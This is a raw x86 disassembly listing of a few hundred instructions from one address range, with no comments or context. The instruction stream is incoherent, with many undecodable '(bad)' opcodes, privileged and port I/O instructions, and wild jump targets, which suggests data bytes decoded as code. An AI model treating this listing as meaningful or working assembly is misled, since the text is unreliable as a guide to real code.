  41d081:	lods   eax,DWORD PTR ds:[esi]
  41d082:	sub    ecx,DWORD PTR [eax+0x395c8ca7]
  41d088:	push   edx
  41d089:	mov    edi,0xfe2b356e
  41d08e:	test   DWORD PTR [ebx+0x2c],ecx
  41d091:	out    dx,eax
  41d092:	pushf  
  41d093:	push   esi
  41d094:	sbb    BYTE PTR [ecx-0x7e43c6f8],bh
  41d09a:	inc    ebp
  41d09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d09c:	push   ebx
  41d09d:	adc    bl,BYTE PTR [edi+0x3]
  41d0a0:	mov    edx,0xe76da60d
  41d0a5:	nop
  41d0a6:	in     al,0x3d
  41d0a8:	push   cs
  41d0a9:	aaa    
  41d0aa:	in     eax,0x20
  41d0ac:	dec    ebx
  41d0ad:	jb     0x41d05f
  41d0af:	stc    
  41d0b0:	sti    
  41d0b1:	shl    BYTE PTR [ebp-0x4],cl
  41d0b4:	ja     0x41d0be
  41d0b6:	mov    bl,0x5d
  41d0b8:	adc    DWORD PTR [edi+0x6e],ecx
  41d0bb:	mov    eax,0xc0497472
  41d0c0:	cs icebp 
  41d0c2:	xor    bl,BYTE PTR [edi+eiz*2+0x51140e90]
  41d0c9:	adc    DWORD PTR [edi+ebx*8+0x33],esp
  41d0cd:	rol    DWORD PTR [esi+ecx*4-0x7d],1
  41d0d1:	(bad)  
  41d0d2:	mov    eax,ds:0x2c2ecc6a
  41d0d7:	into   
  41d0d8:	mov    al,0xae
  41d0da:	or     bl,al
  41d0dc:	(bad)  
  41d0dd:	adc    al,0xea
  41d0df:	dec    ebp
  41d0e0:	dec    ecx
  41d0e1:	int    0xea
  41d0e3:	stos   DWORD PTR es:[edi],eax
  41d0e4:	sub    BYTE PTR [ebp+0x6b],ah
  41d0e7:	test   BYTE PTR [edi+0x7d740520],bh
  41d0ed:	mov    edi,0x795de79d
  41d0f2:	lods   eax,DWORD PTR ds:[esi]
  41d0f3:	push   ecx
  41d0f4:	dec    eax
  41d0f5:	inc    ebp
  41d0f6:	mov    cl,0x33
  41d0f8:	fdivr  st,st(3)
  41d0fa:	jge    0x41d0e1
  41d0fc:	nop
  41d0fd:	push   ebp
  41d0fe:	push   ds
  41d0ff:	sub    BYTE PTR [edx],bh
  41d101:	(bad)  
  41d102:	fnstcw WORD PTR [edi+0x61]
  41d105:	push   es
  41d106:	push   ds
  41d107:	mov    BYTE PTR [edx],0xcc
  41d10a:	xor    BYTE PTR [ebx],cl
  41d10c:	retf   0xf88
  41d10f:	jecxz  0x41d14c
  41d111:	fadd   st(6),st
  41d113:	adc    dl,BYTE PTR [eax+0x79fce75]
  41d119:	push   ds
  41d11a:	cmp    ebp,0x38
  41d11d:	mov    ebp,0xda0d68ff
  41d122:	sub    esi,DWORD PTR [edx+ebx*2+0x4099168]
  41d129:	(bad)  
  41d12a:	int3   
  41d12b:	(bad)  
  41d12d:	mov    ax,0xe629
  41d131:	mov    BYTE PTR [ecx+edi*1-0x59],cl
  41d135:	add    ebp,DWORD PTR [edx]
  41d137:	sbb    edi,esi
  41d139:	sbb    ah,al
  41d13b:	jbe    0x41d17f
  41d13d:	sbb    DWORD PTR [ebp+0x711e316f],ebp
  41d143:	jmp    0x952b0472
  41d148:	pop    ebp
  41d149:	sti    
  41d14a:	fild   WORD PTR [eax+0x4ed9f0a0]
  41d150:	mul    dh
  41d152:	and    al,BYTE PTR [esi-0x4d98d53e]
  41d158:	pushf  
  41d159:	in     eax,dx
  41d15a:	int    0x82
  41d15c:	xor    DWORD PTR [edi+0x29],esp
  41d15f:	cmc    
  41d160:	and    cl,BYTE PTR [ecx-0x26]
  41d163:	stc    
  41d164:	aaa    
  41d165:	sub    esi,DWORD PTR [edi+0x74207eb8]
  41d16b:	ret    0x4add
  41d16e:	test   eax,0x32a9ac45
  41d173:	retf   0x9195
  41d176:	pop    es
  41d177:	jmp    0xd2de:0xfe0e0f7e
  41d17e:	jge    0x41d138
  41d180:	sub    esi,DWORD PTR [edi+0x40775353]
  41d186:	(bad)  
  41d187:	push   es
  41d188:	test   eax,0xdfa17016
  41d18d:	fsub   st,st(2)
  41d18f:	(bad)  
  41d190:	jae    0x41d183
  41d192:	mov    al,0xf7
  41d194:	and    esp,ecx
  41d196:	push   esi
  41d197:	ret    
  41d198:	inc    edx
  41d199:	mov    ds:0xc0e5fd2e,eax
  41d19e:	fstp   DWORD PTR [edx]
  41d1a0:	push   edx
  41d1a1:	call   0x95d4cdbd
  41d1a6:	or     eax,0x1
  41d1a9:	and    eax,DWORD PTR [ebp-0x24]
  41d1ac:	inc    ebp
  41d1ad:	in     al,dx
  41d1ae:	out    dx,eax
  41d1af:	push   eax
  41d1b0:	xchg   esp,eax
  41d1b1:	jp     0x41d18c
  41d1b3:	add    DWORD PTR [edi],edx
  41d1b5:	pop    ds
  41d1b6:	mov    edi,0xc0b3991e
  41d1bb:	loop   0x41d232
  41d1bd:	add    DWORD PTR [ecx+0x6],0xffffffa2
  41d1c1:	out    0x89,eax
  41d1c3:	add    al,0x44
  41d1c5:	mov    edi,cr3
  41d1c8:	xor    BYTE PTR [esi],0x46
  41d1cb:	mov    al,BYTE PTR [eax-0xd88a423]
  41d1d1:	in     eax,dx
  41d1d2:	aad    0xc2
  41d1d4:	test   al,0xa3
  41d1d6:	ror    cl,cl
  41d1d8:	mov    DWORD PTR [esi+esi*2+0xb76b7c0],ebp
  41d1df:	jbe    0x41d1e3
  41d1e1:	pop    esp
  41d1e2:	inc    esp
  41d1e3:	aad    0xab
  41d1e5:	jle    0x41d20c
  41d1e7:	mov    eax,DWORD PTR [ebx+0x4d996eb7]
  41d1ed:	outs   dx,BYTE PTR ds:[esi]
  41d1ee:	xor    al,cl
  41d1f0:	xchg   esp,eax
  41d1f1:	xor    eax,0xb95ede2
  41d1f6:	dec    ebp
  41d1f7:	leave  
  41d1f8:	hlt    
  41d1f9:	int    0xc2
  41d1fb:	enter  0xbca,0x8b
  41d1ff:	mov    esi,0x8c1847aa
  41d204:	sub    al,BYTE PTR [esi]
  41d206:	mov    ebx,0xb8881f76
  41d20b:	and    eax,0x7d72bb0a
  41d210:	sbb    al,0xf4
  41d212:	ins    BYTE PTR es:[edi],dx
  41d213:	out    dx,eax
  41d214:	inc    edx
  41d215:	jmp    0x41df462
  41d21a:	pop    ds
  41d21b:	imul   eax,esi,0x354ce968
  41d221:	xchg   esi,eax
  41d222:	jmp    0x41d256
  41d224:	aam    0x95
  41d226:	sub    BYTE PTR [edi],0x98
  41d229:	call   0x3231:0x5e88ceca
  41d230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d231:	xbegin 0x379b05b3
  41d237:	xchg   ebx,eax
  41d238:	loope  0x41d1c5
  41d23a:	jns    0x41d23a
  41d23c:	adc    DWORD PTR [edx+0x34790752],edx
  41d242:	xor    DWORD PTR [ebp+eax*8-0x44],edx
  41d246:	mov    bl,0x69
  41d248:	inc    ecx
  41d249:	jns    0x41d259
  41d24b:	mov    DWORD PTR [esi+0x1],esp
  41d24e:	leave  
  41d24f:	out    dx,al
  41d250:	inc    ebp
  41d251:	pop    ebp
  41d252:	xlat   BYTE PTR ds:[ebx]
  41d253:	inc    eax
  41d254:	or     dh,ah
  41d256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d257:	jnp    0x41d22e
  41d259:	add    ebp,0x2
  41d25c:	push   ebp
  41d25d:	in     eax,dx
  41d25e:	sbb    DWORD PTR [edi],esp
  41d260:	pop    esp
  41d261:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d263:	shr    DWORD PTR [ecx],cl
  41d265:	or     al,0x2a
  41d267:	(bad)  
  41d268:	mov    ch,0xa9
  41d26a:	sbb    edi,ebp
  41d26c:	push   es
  41d26d:	cwde   
  41d26e:	sar    DWORD PTR [ecx],0x9b
  41d271:	sti    
  41d272:	jo     0x41d2c7
  41d274:	and    DWORD PTR [eax],eax
  41d276:	hlt    
  41d277:	xor    DWORD PTR [ebx*2-0x12fb178b],esp
  41d27e:	mov    bh,0xd
  41d280:	jle    0x41d2fb
  41d282:	mov    ah,0x10
  41d284:	push   cs
  41d285:	outs   dx,BYTE PTR ds:[esi]
  41d286:	add    ebx,DWORD PTR [ecx+eiz*8-0x28]
  41d28a:	mov    ah,0x23
  41d28c:	sbb    dl,BYTE PTR ds:[edx+eax*1]
  41d290:	mov    cl,0xb9
  41d292:	pop    ebp
  41d293:	push   esi
  41d294:	xchg   edx,eax
  41d295:	sub    dl,BYTE PTR [ebp+0x2c6dc65b]
  41d29b:	xlat   BYTE PTR ds:[ebx]
  41d29c:	les    esi,FWORD PTR [edi+0x51]
  41d29f:	setle  cl
  41d2a2:	inc    edx
  41d2a3:	push   ecx
  41d2a4:	std    
  41d2a5:	cmp    BYTE PTR [ebp+0x7d],al
  41d2a8:	mov    esp,esi
  41d2aa:	xchg   DWORD PTR [edx-0x40cb3a58],eax
  41d2b0:	sbb    al,0xef
  41d2b2:	lock fsub QWORD PTR [ebx+0x63]
  41d2b6:	fisttp WORD PTR [ecx]
  41d2b8:	cld    
  41d2b9:	push   edx
  41d2ba:	aad    0x2e
  41d2bc:	(bad)  [ecx]
  41d2be:	push   ss
  41d2bf:	xor    bh,BYTE PTR [ecx]
  41d2c1:	xchg   esp,eax
  41d2c2:	es jne 0x41d2a8
  41d2c5:	add    DWORD PTR [edx-0x5d],ecx
  41d2c8:	(bad)  
  41d2c9:	je     0x41d24f
  41d2cb:	jle    0x41d33e
  41d2cd:	hlt    
  41d2ce:	pop    esp
  41d2cf:	aas    
  41d2d0:	ins    DWORD PTR es:[edi],dx
  41d2d1:	out    dx,al
  41d2d2:	xor    dl,dl
  41d2d4:	mov    bl,0xb1
  41d2d6:	mov    dl,0x41
  41d2d8:	push   0xfd94b81d
  41d2dd:	dec    ebp
  41d2de:	popa   
  41d2df:	dec    edi
  41d2e0:	or     eax,0x42b8e1b5
  41d2e5:	adc    eax,0xf403e933
  41d2ea:	int3   
  41d2eb:	je     0x41d365
  41d2ed:	ds jg  0x41d36c
  41d2f0:	and    edx,DWORD PTR [ecx+eax*1-0x52]
  41d2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2f5:	push   ebp
  41d2f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2f7:	or     BYTE PTR ds:0x136b67a9,0x3
  41d2fe:	repnz outs dx,BYTE PTR ds:[esi]
  41d300:	jmp    0x41d321
  41d302:	jo     0x41d285
  41d304:	cli    
  41d305:	addr16 std 
  41d307:	repz fld st(0)
  41d30a:	(bad)  
  41d30b:	xchg   ecx,eax
  41d30c:	test   al,0xf7
  41d30e:	mov    ebx,edx
  41d310:	inc    esp
  41d311:	and    al,bl
  41d313:	pusha  
  41d314:	iret   
  41d315:	jge    0x41d304
  41d317:	xchg   edx,eax
  41d318:	lahf   
  41d319:	in     eax,dx
  41d31a:	dec    edi
  41d31b:	test   DWORD PTR [ebp+0x4d415676],ebx
  41d321:	fs pop ebp
  41d323:	dec    eax
  41d324:	xlat   BYTE PTR ds:[ebx]
  41d325:	out    dx,al
  41d326:	fisttp QWORD PTR [edi-0x3f]
  41d329:	out    dx,al
  41d32a:	ins    DWORD PTR es:[edi],dx
  41d32b:	dec    esi
  41d32c:	popf   
  41d32d:	push   edi
  41d32e:	rcl    DWORD PTR [edi-0x2e5cc368],0x65
  41d335:	loope  0x41d34d
  41d337:	in     eax,0xe0
  41d339:	out    dx,al
  41d33a:	jle    0x41d38c
  41d33c:	push   ecx
  41d33d:	and    dh,BYTE PTR [eax+0x65]
  41d340:	daa    
  41d341:	(bad)  [esi]
  41d343:	sbb    al,0xe
  41d345:	cmp    eax,0x930bd935
  41d34a:	jmp    0xc37:0x80ed4cfe
  41d351:	and    DWORD PTR [ebp-0xa],0x20
  41d355:	sub    DWORD PTR [ebx],esp
  41d357:	bound  eax,QWORD PTR [esi+0x27]
  41d35a:	int3   
  41d35b:	data16 (bad) 
  41d35d:	(bad)  
  41d35e:	shl    cl,1
  41d360:	ss popa 
  41d362:	or     bh,BYTE PTR [esi+0x242c1fae]
  41d368:	xchg   ebx,eax
  41d369:	int    0xcb
  41d36b:	pop    esi
  41d36c:	dec    esi
  41d36d:	fcomp  QWORD PTR [ebx+0x2729324c]
  41d373:	mov    esi,0xff350d1b
  41d378:	call   0x588e7dbe
  41d37d:	cmp    dl,BYTE PTR [eax]
  41d37f:	fwait
  41d380:	mov    edx,0x3031948e
  41d385:	push   ds
  41d386:	sbb    eax,0x9867eea4
  41d38b:	(bad)  
  41d38c:	cmc    
  41d38d:	dec    esp
  41d38e:	xchg   ebx,ecx
  41d390:	(bad)  
  41d391:	cmp    al,0x74
  41d394:	pop    ds
  41d395:	ror    BYTE PTR [edi-0x22],cl
  41d398:	adc    al,0x7f
  41d39a:	icebp  
  41d39b:	(bad)  
  41d39c:	imul   ecx,DWORD PTR [ebx+edx*4+0x6cd2dcbf],0xd6ee6abd
  41d3a7:	sub    DWORD PTR [edx+0x11],esi
  41d3aa:	ins    BYTE PTR es:[edi],dx
  41d3ab:	inc    edi
  41d3ac:	out    0xef,al
  41d3ae:	add    DWORD PTR [esi+eax*2+0x2a308f34],eax
  41d3b5:	xchg   esi,eax
  41d3b6:	in     al,0xb8
  41d3b8:	adc    esi,DWORD PTR [edi]
  41d3ba:	inc    ebp
  41d3bb:	mov    bh,0x16
  41d3bd:	or     ch,BYTE PTR ds:0x7450426a
  41d3c3:	xchg   edx,eax
  41d3c4:	pop    ds
  41d3c5:	ret    0x49f5
  41d3c8:	repz xor dl,BYTE PTR [ebx-0x1d]
  41d3cc:	ror    BYTE PTR [edx+0x28315e64],0x5
  41d3d3:	fs into 
  41d3d5:	or     DWORD PTR ss:[edi],0x4d
  41d3d9:	(bad)  
  41d3da:	stc    
  41d3db:	scas   al,BYTE PTR es:[di]
  41d3dd:	fild   DWORD PTR [ebx+0x1d]
  41d3e0:	test   al,0x15
  41d3e2:	mov    bh,BYTE PTR [edi-0x5edde4c8]
  41d3e8:	(bad)  
  41d3e9:	cmp    al,0x3
  41d3eb:	clc    
  41d3ec:	(bad)  
  41d3ed:	icebp  
  41d3ee:	enter  0x5d0d,0x44
  41d3f2:	ins    DWORD PTR es:[edi],dx
  41d3f3:	cdq    
  41d3f4:	and    ebp,ebp
  41d3f6:	outs   dx,BYTE PTR ds:[esi]
  41d3f7:	std    
  41d3f8:	sub    eax,0x5f18c960
  41d3fd:	js     0x41d434
  41d3ff:	aas    
  41d400:	enter  0x4fa7,0xc7
  41d404:	sub    DWORD PTR [esi],0x17c31a6e
  41d40a:	sti    
  41d40b:	dec    ebp
  41d40c:	mov    edx,0x7679da5
  41d411:	dec    ebx
  41d412:	out    0x6a,eax
  41d414:	clc    
  41d415:	add    al,0xd6
  41d417:	icebp  
  41d418:	sbb    al,0x5e
  41d41a:	adc    ecx,eax
  41d41c:	sar    BYTE PTR [edx-0x3d344c90],0xc4
  41d423:	or     BYTE PTR [edx+0x180daf60],bl
  41d429:	xchg   ebx,eax
  41d42a:	out    0xc,eax
  41d42c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d42d:	or     DWORD PTR [ecx],edi
  41d42f:	retf   0xb60a
  41d432:	mov    ?,WORD PTR [ebx]
  41d434:	and    eax,0x2ac5f8ff
  41d439:	icebp  
  41d43a:	and    DWORD PTR [ecx+ecx*8],ebp
  41d43d:	pop    esi
  41d43e:	lods   eax,DWORD PTR ds:[esi]
  41d43f:	sub    edi,DWORD PTR [edi-0x629f7a7a]
  41d445:	add    DWORD PTR [ebx+eax*1],esp
  41d448:	ror    BYTE PTR [ebx-0x5d1130e2],0xe8
  41d44f:	outs   dx,BYTE PTR ds:[esi]
  41d450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d451:	cmp    eax,0x95eeb48e
  41d456:	or     edi,ecx
  41d458:	xchg   ebx,eax
  41d459:	cmp    BYTE PTR [ecx-0x1a72338c],ah
  41d45f:	outs   dx,DWORD PTR ds:[esi]
  41d460:	loop   0x41d440
  41d462:	fs popf 
  41d464:	jmp    0xace82fac
  41d469:	out    dx,al
  41d46a:	sbb    al,0xc8
  41d46c:	mov    ds:0xee697063,al
  41d471:	mov    gs,WORD PTR [ecx+0x450d93ac]
  41d477:	retf   
  41d478:	loope  0x41d4a7
  41d47a:	xchg   edx,eax
  41d47b:	dec    eax
  41d47c:	cmp    BYTE PTR [edi],dh
  41d47e:	adc    edx,edx
  41d480:	dec    esi
  41d481:	in     eax,0x1a
  41d483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d484:	out    dx,eax
  41d485:	xchg   ecx,eax
  41d486:	mov    esp,DWORD PTR [eax]
  41d488:	pusha  
  41d489:	pop    ss
  41d48a:	fidiv  DWORD PTR [eax]
  41d48c:	xor    al,0xf9
  41d48e:	mov    eax,fs:0x2794db34
  41d494:	pop    edi
  41d495:	pusha  
  41d496:	(bad)  cs:[eax-0xe]
  41d49a:	stos   DWORD PTR es:[edi],eax
  41d49b:	mov    dh,BYTE PTR [ebx]
  41d49d:	or     al,0x1c
  41d49f:	sbb    BYTE PTR [ecx],ch
  41d4a1:	mov    ch,0xf8
  41d4a3:	ins    BYTE PTR es:[edi],dx
  41d4a4:	(bad)  
  41d4a5:	lods   eax,DWORD PTR ds:[esi]
  41d4a6:	bound  esp,QWORD PTR [edx]
  41d4a8:	xchg   edi,eax
  41d4a9:	and    BYTE PTR [edx+0x54ae70fb],0x67
  41d4b0:	scas   eax,DWORD PTR es:[edi]
  41d4b1:	outs   dx,BYTE PTR ds:[esi]
  41d4b2:	les    ebp,FWORD PTR [ecx+0x602b7163]
  41d4b8:	and    eax,0x438b9dd5
  41d4bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4be:	cmp    DWORD PTR [esi-0x58381bf9],ebx
  41d4c4:	mov    al,0xf
  41d4c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4c7:	cmp    BYTE PTR [edi+0x2e6956d6],cl
  41d4cd:	sar    DWORD PTR [edi],0x94
  41d4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4d1:	pop    ebx
  41d4d2:	test   eax,0x891d1e9f
  41d4d7:	fcom   QWORD PTR [edi-0x2ee30a33]
  41d4dd:	nop
  41d4de:	in     al,dx
  41d4df:	jo     0x41d488
  41d4e1:	inc    ecx
  41d4e2:	push   es
  41d4e3:	ret    
  41d4e4:	mov    ds:0xd182f745,eax
  41d4e9:	mov    eax,0x48e15ebd
  41d4ee:	in     eax,0xc9
  41d4f0:	popf   
  41d4f1:	mov    DWORD PTR [edi],esi
  41d4f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f4:	sar    BYTE PTR [ebp-0x5b],cl
  41d4f7:	ficom  DWORD PTR [eax]
  41d4f9:	adc    BYTE PTR [eax-0x77],al
  41d4fc:	mov    esp,0x9bc880c0
  41d501:	dec    edx
  41d502:	cmp    bl,dl
  41d504:	(bad)  
  41d505:	(bad)  
  41d506:	in     al,dx
  41d507:	mov    ds:0xe2bf6188,al
  41d50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d50d:	fsubr  DWORD PTR [edx+0x25]
  41d510:	add    ah,BYTE PTR [eax+0x4e6709a0]
  41d516:	dec    edx
  41d517:	cdq    
  41d518:	dec    ebx
  41d519:	jp     0x41d4d6
  41d51b:	jne    0x41d509
  41d51d:	test   ebp,ebp
  41d51f:	outs   dx,DWORD PTR ds:[esi]
  41d520:	push   ss
  41d521:	inc    eax
  41d522:	stc    
  41d523:	add    DWORD PTR [esi-0x1965b9e1],0x356b6376
  41d52d:	shl    ebx,0x9
  41d530:	iret   
  41d531:	stos   DWORD PTR es:[edi],eax
  41d532:	sbb    cl,BYTE PTR [ecx+0x7f1d0509]
  41d538:	mov    edi,0x5b278a33
  41d53d:	mov    ds:0xac013e29,eax
  41d542:	adc    esi,DWORD PTR [esp+esi*8]
  41d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d546:	sub    eax,0xaec8f569
  41d54b:	ds push edi
  41d54d:	mov    eax,DWORD PTR [edx-0xb]
  41d550:	cmp    BYTE PTR [ecx-0xa766708],dh
  41d556:	sbb    ebx,edx
  41d558:	jecxz  0x41d522
  41d55a:	ret    0x5f15
  41d55d:	lods   eax,DWORD PTR ds:[esi]
  41d55e:	jl     0x41d515
  41d560:	push   esp
  41d561:	push   0x7cecd2e6
  41d566:	pop    esi
  41d567:	xor    al,ah
  41d569:	pop    edi
  41d56a:	in     al,dx
  41d56b:	mov    al,0x88
  41d56d:	add    eax,0x949a3ef
  41d572:	jge    0x41d5c7
  41d574:	jbe    0x41d584
  41d576:	outs   dx,BYTE PTR ds:[esi]
  41d577:	jae    0x41d589
  41d579:	out    dx,al
  41d57a:	jmp    0xeebfb566
  41d57f:	test   al,0x67
  41d581:	xchg   esi,eax
  41d582:	(bad)  
  41d583:	mov    esi,0x72928e20
  41d588:	and    esi,DWORD PTR [ebp-0x1f]
  41d58b:	sbb    al,0xa1
  41d58d:	(bad)  
  41d58e:	adc    dh,BYTE PTR [edx+0x527230bd]
  41d594:	cmp    esp,DWORD PTR [edx-0x37]
  41d597:	fcmovb st,st(6)
  41d599:	outs   dx,DWORD PTR ds:[esi]
  41d59a:	ficom  DWORD PTR [ecx]
  41d59c:	mov    ss,WORD PTR [eax+eax*8+0x4]
  41d5a0:	(bad)  
  41d5a1:	fisub  WORD PTR [eax]
  41d5a3:	mov    DWORD PTR [eax+0xe],edi
  41d5a6:	mov    ch,0x74
  41d5a8:	(bad)  
  41d5a9:	sub    eax,0xe54ef111
  41d5ae:	imul   edx,ebx,0xc72079c
  41d5b4:	and    al,0x37
  41d5b6:	mov    ebp,0xe9efe394
  41d5bb:	lea    edx,[edx]
  41d5bd:	dec    edx
  41d5be:	pop    ebp
  41d5bf:	cmc    
  41d5c0:	or     eax,ebx
  41d5c2:	pushf  
  41d5c3:	arpl   WORD PTR [ebp-0x18],dx
  41d5c6:	mov    DWORD PTR [eax+eax*1],0xc16137c2
  41d5cd:	mov    BYTE PTR [ebp-0x27],cl
  41d5d0:	mov    ds:0x83e388c4,al
  41d5d5:	mov    dl,0xf5
  41d5d7:	adc    DWORD PTR [ebp+0x18fcec2e],edi
  41d5dd:	dec    esp
  41d5de:	xor    DWORD PTR [eax],esi
  41d5e0:	cmp    ebx,eax
  41d5e2:	bound  ebp,QWORD PTR [ebp-0x47388745]
  41d5e8:	icebp  
  41d5e9:	repnz test eax,edi
  41d5ec:	dec    edi
  41d5ed:	xchg   edx,eax
  41d5ee:	aad    0xda
  41d5f0:	xchg   edi,ebx
  41d5f2:	and    bl,BYTE PTR [ebp+ecx*4-0x348f860]
  41d5f9:	push   0xffffff9d
  41d5fb:	pushf  
  41d5fc:	cmp    eax,0xd0b561ac
  41d601:	popf   
  41d602:	retf   
  41d603:	ins    BYTE PTR es:[edi],dx
  41d604:	jp     0x41d5fe
  41d606:	psubd  mm4,QWORD PTR [ecx]
  41d609:	repnz add BYTE PTR [eax-0x2a553833],bh
  41d610:	scas   eax,DWORD PTR es:[edi]
  41d611:	or     BYTE PTR [ebp-0x6210c2ae],dh
  41d617:	hlt    
  41d618:	jmp    0x516313fc
  41d61d:	sbb    ebp,ebx
  41d61f:	mov    dl,0x54
  41d621:	stos   DWORD PTR es:[edi],eax
  41d622:	jp     0x41d5a6
  41d624:	int    0xc8
  41d626:	inc    esp
  41d627:	jp     0x41d5dd
  41d629:	je     0x41d5d6
  41d62b:	inc    edi
  41d62c:	loop   0x41d6a3
  41d62e:	xacquire xchg BYTE PTR [edx+0x4d],cl
  41d632:	jbe    0x41d612
  41d634:	sub    DWORD PTR [ebp+ecx*1+0xc259e12],esp
  41d63b:	mov    ds:0x6aa669b6,eax
  41d640:	mov    ebp,0x9a7e7d1b
  41d645:	xchg   BYTE PTR [eax+0x7c4cde3d],al
  41d64b:	jb     0x41d674
  41d64d:	pop    ss
  41d64e:	js     0x41d603
  41d650:	fisub  WORD PTR [ecx-0x1b]
  41d653:	push   cs
  41d654:	push   esp
  41d655:	lods   al,BYTE PTR ds:[esi]
  41d656:	cmp    BYTE PTR [edi-0xc],al
  41d659:	dec    ebp
  41d65a:	hlt    
  41d65b:	mov    ebx,0x587eab25
  41d660:	sbb    eax,0xbc2746b7
  41d665:	sub    eax,0xc4fb9cea
  41d66a:	xchg   ebx,eax
  41d66b:	inc    ecx
  41d66c:	mov    bl,BYTE PTR ds:0xc477067d
  41d672:	or     DWORD PTR [edi],eax
  41d674:	jl     0x41d5f7
  41d676:	mov    DWORD PTR [esi],esp
  41d678:	pop    ebx
  41d679:	xchg   ebx,eax
  41d67b:	adc    edi,DWORD PTR [esi+0x2ce20303]
  41d681:	inc    BYTE PTR [esi-0x56]
  41d684:	cmp    DWORD PTR [edi-0xe77516c],ebp
  41d68a:	push   0xffffffc6
  41d68c:	lock fnstenv [ebp+0xee3e32a]
  41d693:	jb     0x41d6a5
  41d695:	mov    al,0xe6
  41d697:	and    dl,dh
  41d699:	xchg   ebx,eax
  41d69a:	push   eax
  41d69b:	sbb    eax,0x875d65b3
  41d6a0:	pop    eax
  41d6a1:	xor    DWORD PTR [edx-0x12],esi
  41d6a4:	imul   ebp,DWORD PTR [edi],0x14
  41d6a7:	adc    eax,0xfb0dccee
  41d6ac:	ret    
  41d6ad:	ss mov edi,0x62dbd4c4
  41d6b3:	sti    
  41d6b4:	sub    dl,BYTE PTR [edi+eiz*1]
  41d6b7:	pop    ecx
  41d6b8:	inc    ebp
  41d6b9:	jns    0x41d68a
  41d6bb:	retf   
  41d6bc:	sbb    eax,0x64c4bb83
  41d6c1:	xchg   esi,eax
  41d6c2:	scas   al,BYTE PTR es:[edi]
  41d6c3:	cmp    BYTE PTR [ecx+0x46b3810b],cl
  41d6c9:	pop    esi
  41d6ca:	jns    0x41d68c
  41d6cc:	sbb    al,0x6
  41d6ce:	sti    
  41d6cf:	aad    0xaa
  41d6d1:	push   0x4c
  41d6d3:	mov    DWORD PTR [edi],edx
  41d6d5:	xchg   esi,eax
  41d6d6:	popa   
  41d6d7:	or     eax,0x9baeee3
  41d6dc:	inc    esp
  41d6dd:	sub    eax,0xd9f17613
  41d6e2:	mov    ch,0x7a
  41d6e4:	getsec 
  41d6e6:	and    DWORD PTR [ebp+0x337786d8],edi
  41d6ec:	icebp  
  41d6ed:	adc    edi,DWORD PTR [edi-0x7d]
  41d6f0:	dec    edi
  41d6f1:	cmp    eax,DWORD PTR [ecx+esi*2-0x73ca8382]
  41d6f8:	jl     0x41d745
  41d6fa:	dec    eax
  41d6fb:	cdq    
  41d6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6fd:	jns    0x41d717
  41d6ff:	shl    BYTE PTR [ecx-0xd],0x97
  41d703:	scas   eax,DWORD PTR es:[edi]
  41d704:	enter  0xfe46,0x4f
  41d708:	sbb    cl,BYTE PTR [edx]
  41d70a:	es xchg edx,eax
  41d70c:	push   ecx
  41d70d:	hlt    
  41d70e:	arpl   WORD PTR [edx],di
  41d710:	sub    ch,BYTE PTR [eax]
  41d712:	xchg   edx,eax
  41d713:	pop    edx
  41d714:	dec    esi
  41d715:	(bad)  
  41d716:	xlat   BYTE PTR ds:[ebx]
  41d717:	out    0xc1,al
  41d719:	cmp    eax,0xbeb0c9b2
  41d71e:	nop
  41d71f:	xor    al,0xaf
  41d721:	enter  0x7ef3,0xc6
  41d725:	pop    edx
  41d726:	jbe    0x41d766
  41d728:	fstp   DWORD PTR [eax+0x40735cce]
  41d72e:	icebp  
  41d72f:	pop    esp
  41d730:	cmp    dh,al
  41d732:	(bad)  
  41d733:	jo     0x41d741
  41d735:	int    0x79
  41d737:	push   es
  41d738:	mov    dl,0x4c
  41d73a:	sbb    al,BYTE PTR [eax+ebx*1]
  41d73d:	icebp  
  41d73e:	xorps  xmm4,XMMWORD PTR [eax-0x55da1423]
  41d745:	push   esp
  41d746:	fmulp  st(4),st
  41d748:	and    dl,BYTE PTR gs:[ebx]
  41d74b:	loope  0x41d731
  41d74d:	xchg   ebx,eax
  41d74e:	add    bl,BYTE PTR [edx-0x72]
  41d751:	pop    ds
  41d752:	sub    al,0x62
  41d754:	rcr    bl,1
  41d756:	lahf   
  41d757:	rcl    BYTE PTR [ecx+0x379c1669],1
  41d75d:	xchg   DWORD PTR [eax+0x65260fa0],ecx
  41d763:	cmp    al,0x36
  41d765:	add    al,0xb5
  41d767:	dec    edi
  41d768:	ret    
  41d769:	mov    ebx,0x6d0514e5
  41d76e:	addr16 ds dec esi
  41d771:	mov    ah,0xd6
  41d773:	stos   DWORD PTR es:[edi],eax
  41d774:	ins    BYTE PTR es:[edi],dx
  41d775:	addr16 hlt 
  41d777:	jmp    0x345a:0x8c69d2fb
  41d77e:	adc    dh,dh
  41d780:	shl    BYTE PTR [edi+0x22],cl
  41d783:	push   es
  41d784:	mov    esp,DWORD PTR [ecx+0x51a8c4c1]
  41d78a:	cmp    DWORD PTR [eax+0x22],ebp
  41d78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d78e:	arpl   bp,dx
  41d790:	ja     0x41d794
  41d792:	pop    ss
  41d793:	mov    DWORD PTR [esi],0x4872e832
  41d799:	data16 (bad) 
  41d79b:	and    al,0x96
  41d79d:	jg     0x41d76f
  41d79f:	jg     0x41d800
  41d7a1:	in     eax,dx
  41d7a2:	xchg   esi,eax
  41d7a3:	les    ebp,FWORD PTR [edi-0x18]
  41d7a6:	push   ebp
  41d7a7:	out    0x5b,al
  41d7a9:	mov    ecx,0x5ece938d
